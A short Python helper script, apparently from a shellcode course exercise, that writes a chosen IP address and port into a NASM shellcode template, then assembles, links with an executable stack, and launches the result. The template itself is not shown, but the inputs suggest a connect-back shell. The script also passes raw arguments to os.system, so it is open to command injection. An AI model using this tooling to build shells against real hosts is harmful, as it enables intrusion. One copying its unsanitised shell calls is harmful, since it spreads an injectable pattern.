#!/usr/bin/python
# Script to automate shellcode compiling process 
# fixing desired port by using template
# Author: l0wlevel

import os
import sys
import struct
import binascii
import socket

f1=sys.argv[1]+'.nasm'
ip=sys.argv[2]
port=int(sys.argv[3])
f2=sys.argv[1]+'Compile.nasm'

# Reverse hex port
x = struct.unpack('<H', struct.pack('>H',port))[0]
revHexPort = hex(x)
# Reverse ip address
revIp= ip.split('.')[3]+'.'+ip.split('.')[2]+'.'+ip.split('.')[1]+'.'+ip.split('.')[0]
hexRevIp='0x'+binascii.hexlify(socket.inet_aton(revIp))
# Replace selected port ind IP in template
os.system('cp '+f1+' '+f2)
with open(f2,'r') as file:
    filedata = file.read()
filedata= filedata.replace('#REPLACE#',str(revHexPort))
filedata= filedata.replace('#REPLACEIP#',hexRevIp)
with open(f2,'w') as file:
    file.write(filedata)
#Assembling
y=f2.split(".")[0]+'.o '
os.system('nasm -f elf32 -o '+y+f2)
#Linking
os.system('ld -z execstack -o '+f2.split(".")[0]+' '+y)
os.system('sh launcher.sh '+f2.split(".")[0])

